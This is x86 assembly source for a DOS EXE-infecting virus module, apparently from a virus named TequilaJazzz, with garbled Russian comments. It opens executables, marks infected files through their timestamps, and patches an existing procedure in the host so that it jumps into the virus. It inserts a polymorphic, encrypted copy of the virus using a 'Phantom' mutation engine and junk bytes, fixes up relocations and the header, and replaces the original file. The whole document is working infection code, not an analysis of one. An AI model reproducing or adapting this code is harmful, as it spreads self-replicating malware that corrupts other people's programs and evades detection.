   MZ_sign     equ 0
   PartPage    equ 2
   PageCnt     equ 4
   RelocCnt    equ 6
   HdrSize     equ 8
   StackPointer    equ 0Eh
   ChkSum      equ 12h
   EntryPointer    equ 14h
   EntryCS     equ 16h
   TablOffs    equ 18h

   MainInfect  proc
           pushad
           pushf
           push    es
           push    ds

           call    TestFile    ; “¦¥ § à ¦¥
           jz  ExitMain

           cmp word ptr [Header+MZ_sign],'ZM'  ; *¥ EXE'è¨ª
           jne ExitMain

           push    dx      ; „¨áª ¯ãâ¨ á ä ©«®¬
           pop si
           lodsw
           xor bl,bl
           cmp ah,':'
           jne CurrentDisk
           and al,0DFh
           sub al,'A'
           inc al
           mov bl,al
   CurrentDisk:

           mov ax,4409h    ; ‘¥â¥¢®© ¤¨áª ?
           call    DOS
           test    dh,10h
           jz  ExitMain

           mov ax,4408h
           call    DOS
           test    ax,ax
           jnz HardDrive   ; ” ©«   ¦¥áâª®¬ ¤¨áª¥

           mov dx,3F5h
           mov al,4        ; Sense Drive Status
           out dx,al

           mov cx,400h
           loop    $

           in  al,dx       ; “áâ ®¢«¥  § SHIT  ®â § ¯¨á¨
           test    al,40h
           jnz ExitMain
   HardDrive:
           mov dl,bl
           mov ah,36h      ; *®«ãç¨¬ ¬¥áâ®
           call    DOS

           mul bx
           push    dx
           push    ax
           pop eax
           movzx   ecx,cx
           mul ecx

           mov edx,fs:[di+11h]
           add edx,2800h    ; + ¥é¥ 2 Š¡
           cmp eax,edx
           jb  ExitMain     ; Œ «® ¬¥áâ    ¤¨áª¥

           call    UEPInfect

           mov bx,[handle]
           jc  ExitMain

           mov cx,0000h    ; “áâ ®¢¨¬ ‚à¥¬ï/„ âã
   InfTime     equ $ - 2
           mov dx,0000h
   InfDate     equ $ - 2
           mov ax,5701h
           call    DOS
   ExitMain:
           mov ah,3Eh
           call    DOS

           pop ds
           pop es
           popfd
           popad
           ret
   MainInfect  endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   TestFile    proc
   ; *  ¢ëå®¤¥:
   ; ZF=0 - ä ©« ¥ § à ¦¥
   ; ZF=1 - ä ©« § à ¦¥
           lds dx,[FileName]
           push    dx
           mov ax,3D00h
           call    DOS

           push    cs
           pop ds

           mov [Handle],ax   ; ES:DI - File Parameter Block
           mov bx,ax         ; *ã¤¥¬ à ¡®â âì á ä ©«®¬   ãà®¢¥ FPB
           call    GetFPB
           mov word ptr fs:[di+2],2   ; *¥¦¨¬ ®âªàëâ¨ï - Read/Write

           mov ah,3Fh             ; ‘ç¨â ¥¬ § £®«®¢®ª
           mov cx,1Ah
           mov dx,offset Header
           call    DOS

           push    dword ptr fs:[di+0Dh]  ; push ‚à¥¬ï/„ âã
           pop dx
           rol dh,5
           and dh,1Fh             ; — á
           pop ax
           and al,1Fh             ; „¥ì
           xor dh,al
           and dl,1Fh             ; ‘¥ªã¤ë

           cmp dl,dh
           pushf
           je  ItsInfected

           mov eax,fs:[di+0Dh]     ; “áâ ®¢¨¬ ®¢®¥ § ç¥¨¥
           and al,0E0h
           or  al,dh
           mov word ptr [InfTime],ax
           rol eax,10h
           mov word ptr [InfDate],ax
   ItsInfected:
           popf
           pop dx
           ret
   TestFile    endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   UEPinfect   proc

           mov bx,[handle]
           call    GetFPB

           mov edx,fs:[di+11h]   ; edx - RealLen
           mov dword ptr [RealLen],edx

           mov ax,word ptr [Header+PageCnt]
           cwde
           shl eax,9     ; *¥ «ì ï ¤«¨  ¡®«ìè¥ § £àã¦ ¥¬®©
           cmp eax,edx
           jc  ExitUEPInfect     ; ‘ªàëâë© Overlay

           mov ax,word ptr [Header+EntryCS]
           mov bx,word ptr [Header+StackPointer]
           sub bx,ax       ; Š ª ¯à ¢¨«® áâ¥ª ¢ ª®æ¥ ä ©« 
           mov ax,1000h
           jb  FullSegment

           add bx,word ptr [Header+HdrSize]   ; Œ¥áâ® ¤«ï Header'a
           add bx,TeqTempWSP
           cmp ax,bx
           jnb Scarp       ; Ž¡à¥¦¥¬
   FullSegment:
           mov bx,ax       ; BX - áª®«ìª® ¯ à £à ä®¢ ã¦® áç¨â âì
   Scarp:                  ; *¥ ¡®«ìè¥ 64Š¡
           mov ah,48h
           call    DOS
           jnc AllocOK

           mov dx,bx       ; € íâ® ã¦¥ à¨áª®¢ ¥¥...
           inc dx
           call    ReAllocateMEM
   LastAttempt:
           mov ah,48h
           call    DOS
           jnc AllocOK

           cmp bx,800h
           jnb LastAttempt ; …á«¨ ¤ îâ ¥ ¬¥ìè¥ ¯®«®¢¨ë â® ¡¥à¥¬
           ret
   AllocOK:
           mov es,ax
           sub bx,word ptr [Header+HdrSize]
           mov cx,bx
           add bx,ax
           mov gs,bx   ; ‘¥£¬¥â ¤«ï Header'a ¢¬¥áâ¥ á ’*€

           sub cx,TeqTempWSP   ; ‘¥£¬¥â ¤«ï ª®¯¨¨ ¢¨àãá 
           add ax,cx
           mov word ptr [TeqCopyID],ax

           shl cx,4    ; „«¨  áç¨âë¢ ¥¬®£® ¡«®ª 

           mov ax,word ptr [Header+EntryCS]
           movzx   eax,ax
           shl eax,4
           call    BeginData     ; * ç «® CodeSeg ¢ ä ©«¥
           add eax,edx

           mov fs:[di+15h],eax     ;Žâì¥¤¥¬   Code Seg

           push    ds
           push    es  ; DS -   ¢ë¤¥«¥ë© ¡«®ª
           pop ds

           mov bx,cs:[handle]  ; —¨â ¥¬...
           mov ah,3Fh
           xor dx,dx
           call    DOS
           pop ds
           mov [LenCode],ax    ; „«¨  áç¨â ®£® ª®¤ 

           mov word ptr [StartCode],0
           mov word ptr [SearchLen],ax

           xor eax,eax
           mov fs:[di+15h],eax     ; Žâì¥¤¥¬    ç «®

           push    ds      ; —¨â ¥¬ § £®«®¢®ª
           push    gs
           pop ds

           call    BeginData
           mov cx,dx
           xor dx,dx
           mov ah,3Fh
           call    DOS
           pop ds

   ; ˆé¥¬ áâ ¤ àâãî C/Pascal ¯à®æ¥¤ãàã

   NextProcedure:
           call    SearchProc     ; ˆé¥¬ ¯à®æ¥¤ãàã
           jc  FreeBlok       ; *¥âã ...
                          ; ’®«ìª® ¯ ¬ïâì §àï § ¯®£ ¨«¨...:-E

           cmp di,MinPRCLen   ; *à®¢¥à¨¬   ¬¨¨¬ «ì®
           jb  NextProcedure  ; ¤®¯ãáâ¨¬ãî ¤«¨ã

   ; *à®æ¥¤ãà   ©¤¥  ,¯à®¢¥à¨¬ ¥¥   RelocElements

           mov dx,word ptr [Header+EntryCS]
           shl edx,10h
           mov dx,[EnterProc]

           mov dword ptr [ProcAddress],edx ; „«ï ¢ëå®¤  ¢ ®á¨â¥«ì

           call    LineAddress       ; ‹¨¥©ë¥ £à ¨æë
           mov dword ptr [BeginPRC],edx
           mov dx,[ExitProc]
           call    LineAddress
           mov dword ptr [EndPRC],edx

           mov si,word ptr [Header+TablOffs]
           mov cx,word ptr [Header+RelocCnt]
   AllRelocs:
           mov edx,gs:[si]
           call    LineAddress
           cmp edx,12345678h
   BeginPRC    equ $ - 4
           jb  RelOK
           cmp edx,12345678h
   EndPRC      equ $ - 4
           jb  NextProcedure    ; *à®æ¥¤ãà  á®¤¥à¦¨â RelocElement
                        ; ¯®íâ®¬ã ®  ¥ £®¤¨âáï
   RelOK:
           add si,4
           loop    AllRelocs

           push    es   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                               ³
           mov ax,[TeqCopyID]         ; ‘¥£¬¥â ª®¯¨¨...
           mov es,ax               ³
           xor di,di               ³
                               ³
           mov dx,0FF80h    ; RND(0...128)*4 + RND(0...255)
           call    RND             ³
           movzx   cx,dl               ³
           shl cx,2                ³
                               ³
           shr dx,4                ³
           call    RND             ³
           add cx,dx               ³
           push    cx              ³
   FillTRASH:                   ; ‡ «¨«¨ ¬ãá®à®¬
           mov dl,0FFh             ³
           call    RND             ³
           mov al,dl               ³
           stosb                   ³
           loop    FillTRASH           ³
                               ³
           pop ax           ; ‘â àâ®¢®¥ ‘¬¥é¥¨¥
           mov dl,al               ³
           and dl,0Fh              ³
           mov byte ptr [TeqEntryOffset],dl
                               ³
           shr ax,4             ; ‘â àâ®¢ë© á¥£¬¥â
           mov word ptr [TeqEntrySEG],ax   ³
                               ³
   ; ‘¤¥« ¥¬ ¢ëå®¤ ¢ ¢¨àãá                 ³
                               ³
           push    di              ³
                               ³
           mov di,TeqTempWSP-MinPRCLen     ³
           push    di              ³
           mov si,offset PreparePart       ³
           mov cx,9                ³
                               ³
   MakePrPart:                     ³
           push    cx              ³
           lodsb                   ³
           mov ch,al               ³
           shr cx,13               ³
           rep movsb               ³
           push    si              ³
                               ³
           and al,1Fh              ³
           mov [REG_USED],al           ³
           and al,0Fh              ³
           mov ah,al               ³
           shl ah,4                ³
           or  ah,al               ³
           mov [HALF_USED],ah          ³
                               ³
           mov cx,GARBLELen            ³
   TrString:                       ³
           push    cx              ³
                               ³
           mov dx,offset RMTRASH       ³
           mov bx,offset SimplyTRASH       ³
           in  al,40h              ³
           mov cl,al               ³
   RNDExch:    xchg    bx,dx               ³
           dec cl              ³
           jnz RNDExch             ³
           call    bx              ³
                               ³
           pop cx              ³
           loop    TrString            ³
           pop si              ³
           pop cx              ³
           loop    MakePrPart          ³
                               ³
           pop ax              ³
           sub di,ax               ³
           mov [LenPreparePart],di     ³
                               ³
   ; „¥« ¥¬ ¯®«¨¬®àäãî ª®¯¨î - Direct Phantom 2.1     ³
                               ³
           pop di              ³
           mov word ptr [TARGETPLACE],di   ³
           mov word ptr [TARGETPLACE + 2],es
           mov [RELOFFS],0         ³
           mov [DEST_CODE],0FFFFh      ³
           mov [COUNTER],TequilaLen        ³
                               ³
           call    PHANTOM             ³
                               ³
           xor si,si        ; *¥à¥¥§¦ ¥¬
           mov word ptr [PAoffset],di      ³
           cld                 ³
           mov cx,TequilaLen           ³
           rep movsb               ³
                               ³
           mov cx,[LenPreparePart]     ³
                               ³
           mov si,[EnterPROC]   ; *à¨å¢ â¨¬³á á®¡®© ¯à®æ¥¤ãàªã
           pop ds   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
           rep movsb

           jmp $+2

           push    di
           pop bp  ; ‚®â Ž*€ - â¥ªãé ï ¤«¨ 
           mov dx,bp
           neg dl
           and dx,0Fh
           add bp,dx   ; BP - ¤«¨  ¢¨àãá  ¢ëà ¢¥ ï ¤® ¯ à £à ä 

           mov word ptr gs:[CHKSUM],bp   ; „«ï ¨£àë ¢ ¯àïâª¨
           shr bp,4
           mov bx,1234h
   PAoffset    equ $ - 2
           add word ptr es:[bx+ProcAddress + 2],bp

           push    es
           push    ds  ; ES - áª ¨àã¥¬ë© ª®¤
           pop es

           push    cs
           pop ds
           call    JuNK_DoIT     ; ‡ è¨äàã¥¬

           lds dx,[FileName]
           xor di,di          ;‘ä®à¬¨àã¥¬ ¯ãâì ¤«ï á®§¤ ¨ï TmpFile
           push    di
           stc
           call    CopyPath
           push    cs
           pop ds
           mov si,offset UEPTempFile
           call    AddFileName

           pop dx
           push    es
           pop ds
           xor cx,cx
           mov ah,3Ch        ; ‘®§¤ ¥¬ TempFile
           call    DOS
           jc  FreeBlok
           mov cs:[TempHandle],ax

           push    ax

           mov bx,cs:[handle]
           call    GetFPB
           call    BeginData
           mov fs:[di+15h],edx   ; Žâì¥¤¥¬    ç «® ¢ ä ©«¥

           pop bx
           call    GetFPB
           mov fs:[di+15h],edx

           mov cx,bp     ; *¨è¥¬ TequilaJazzz ¢ ®¢ãî ª¢ àâ¨àã
           shl cx,4
           pop ds
           mov ah,40h
           xor dx,dx
           call    DOS

   ; *¥à¥ª®¯¨àã¥¬ ä ©« ¢ Temp ” ©«

           xor eax,eax
           mov [UnderLimit],eax
   CopyFile:
           xor dx,dx
           mov cx,[LenCode]
           mov bx,[handle]
           push    ds
           push    es
           pop ds
           mov ah,3Fh
           call    DOS
           pop ds
           test    ax,ax
           jz  EndCopy
           push    ax

           call    UpdateRelocates

           pop cx
           xor dx,dx
           mov ah,40h
           mov bx,[TempHandle]
           push    ds
           push    es
           pop ds
           call    DOS
           pop ds
           jmp CopyFile
   EndCopy:
           mov ah,68h      ; ‘¡à®á¨¬ ¡ãä¥à ...
           call    DOS

           mov bx,[TempHandle]
           call    GetFPB

   ; Žâì¥¤¥¬   ¯à®æ¥¤ãàã ¢ áª®àà¥ªâ¨à®¢ ®¬ ä ©«¥

           mov edx,[ProcAddress]
           call    LineAddress

           mov eax,edx
           call    BeginData
           add eax,edx

           mov fs:[di+15h],eax

           mov dx,TeqTempWSP-MinPRCLen
           mov cx,[LenPreparePart]
           mov ax,[TeqCopyID]
           mov ds,ax
           mov ah,40h
           call    DOS

           push    cs
           pop ds

           xor edx,edx
           mov fs:[di+15h],edx

   ; ‘ª®àà¥ªâ¨àã¥¬ €¤à¥á â®çª¨ ¢å®¤  ¨ ‘â¥ª 

           add gs:[StackPointer],bp
           add gs:[EntryCS],bp

   ; ‘ª®àà¥ªâ¨àã¥¬ ¤«¨ã ¢ § £®«®¢ª¥
           mov dx,bp
           shl edx,4
           add edx,12345678h
   RealLen     equ $-4

           mov ax,dx
           and ax,1FFh        ;*®¢ ï ¤«¨  ¢ § £®«®¢ª¥
           mov word ptr gs:[PartPage],ax
           pushf
           shr edx,9
           popf
           jz  @temp
           inc dx
   @temp:
           mov word ptr gs:[PageCnt],dx
   ; *¨è¥¬ Header
           call    BeginData
           mov cx,dx
           xor dx,dx
           mov ah,40h
           push    ds
           push    gs
           pop ds
           call    DOS
           pop ds

           push    bx
   ;‡ ªà®¥¬ ä ©«
           mov bx,[handle]
           mov ah,3Eh
           call    DOS

           pop [handle]

   ;“¨çâ®¦¨¬ ä ©«
           lds dx,[FileName]
           mov ah,41h
           call    DOS

   ;*¥à¥¨¬¥ã¥¬ Temp ä ©« ¢ § à ¦ ¥¬ë© ä ©«
           push    ds
           push    dx
           push    es
           xor di,di
           push    di
           stc
           call    CopyPath

           mov si,offset UEPTempFile
           push    cs
           pop ds
           call    AddFileName

           pop dx
           pop ds
           pop di
           pop es
           mov ah,56h
           call    DOS
           clc
   FreeBlok:   pushf
           mov ah,49h       ;Žá¢®¡®¤¨¬ ¯ ¬ïâì
           call    DOS
           popf
   ExitUEPInfect:  ret
   UEPinfect   endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   SearchProc  proc    near
   ;*®¨áª áâ ¤ àâ®© ¤ «ì¥© ¯à®æ¥¤ãàë ¢ ¯¥à¢ëå 64Š¡ ª®¤ 
   ;
   ;  ’¨¯ :    push    bp
   ;       mov bp,sp
   ;        .
   ;        .
   ;        .
   ;       pop bp
   ;       retf [imm8] / retn [imm8]
   ;
   ;
   ; ES - Scanned programm code

   ; *  ¢ëå®¤¥:
   ; DI - ¤«¨  ¯à®æ¥¤ãàë

           mov dx,0FFFFh   ;ID çâ® ¯à®æ¥¤ãà  ¥  ©¤¥ 
           mov cx,00000h
   SearchLen   equ $ - 2
           mov [EnterProc],dx
           mov di,0000h
   StartCode   equ $ - 2

   Scan:
           mov ax,es:[di]
           cmp al,55h      ; PUSH BP
           je  EnterPRC
           cmp al,5Dh      ; POP BP
           je  ExitPRC
   NextScan:
           inc di
           dec cx
           jne Scan
           stc
           retn
   EnterPRC:
           mov ax,es:[di+1]

           cmp ax,0EC8Bh   ; MOV BP,SP
           je  EnterDone
           cmp ax,0E589h
           jne NextScan
   EnterDone:
           mov [EnterProc],di
           jmp NextScan
   ExitPRC:
           cmp [EnterProc],dx
           je  NextScan
           and ah,11110110b
           cmp ah,11000010b
           je  ProcOK      ; RETF/RETF Imm8/RETN/RETN Imm8
           mov [EnterProc],dx
           jmp NextScan
   ProcOK:
           mov [ExitPROC],di
           mov ax,es:[di]  ; ‘â àë¥ ¡ ©â¨ª¨...
           mov [OldBytes],ax

           inc di      ; „«ï ¯®¨áª  á«¥¤ãîé¥©
           inc di
           mov word ptr [StartCode],di

           sub di,[EnterProc]  ; „«¨ 

           mov word ptr [SearchLen],cx
           clc
           ret
   SearchProc  endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   BeginData   proc
   ;EDX - * ç «® ¤ ëå ¢ ä ©«¥
           mov dx,word ptr cs:[Header+HdrSize]
           movzx   edx,dx
           shl dx,4
           ret
   BeginData   endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   GetFPB      proc
   ;‚®§¢à é ¥â ¢ FS:DI  ¤à¥á File Parameter Block
   ;BX - Handle
           push    bx
           push    ax
           push    es
           mov ax,1220h    ;*®¬¥à ¢å®¤  ¢ SFT
           int 2Fh     ;ES:[di]

           mov bl,es:[di]  ;*®«ãç¨¬ ¡«®ª ®¯¨á ¨ï ä ©« 
           mov ax,1216h    ;es:di
           int 2Fh

           push    es
           pop fs

           pop es
           pop ax
           pop bx
           ret
   GetFPB      endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   UpdateRelocates proc

           mov si,word ptr [Header+TablOffs]
           mov cx,word ptr [Header+RelocCnt]
           movzx   eax,[LenCode]
   TunedRelocs:
           mov edx,gs:[si]
           call    LineAddress

           db  66h,81h,0EAh    ; sub edx,UnderLimit
   UnderLimit  dd  0

           jb  GoNextReloc

           cmp edx,eax
           jnb GoNextReloc

           add es:[edx],bp
   GoNextReloc:
           add si,4
           loop    TunedRelocs
           add [UnderLimit],eax
           ret
   UpdateRelocates endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   LineAddress proc
   ;ˆ§ á¥£¬¥â®£® ä®à¬¨àã¥â «¨¥©ë©  ¤à¥á
           push     00
           push     edx
           pop  ax
           movzx    eax,ax
           pop  edx
           shl  edx,4
           add  edx,eax
           ret
   LineAddress endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   PreparePart equ $

           db  01010000b    ; REG_USED + 1...4 ¡ ©â  ª®¬ ¤ë
           pushf
           pusha
           db  00110000b
           push    ds
           db  00110000b
           push    es
           db  01010001b    ; AX - ¥ ¯®àâ¨âì
           mov ah,62h
           db  01011000b    ; BX - ¥ ¯®àâ¨âì
           int 21h
           db  10011000b
           add bx,1234h
   TeqEntrySEG equ $ - 2
           db  00111000b
           push    bx
           db  01010000b
           push    00h
   TeqEntryOffset  equ $ - 1
           db  00110000b
           retf
   EndPrPart   equ $

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ UEP Engine DATA ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   UEPTempFile db  'uepfile.tmp',0
   LenCode     dw  0
   EnterPROC   dw  0
   ExitPROC    dw  0
   TempHandle  dw  0
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
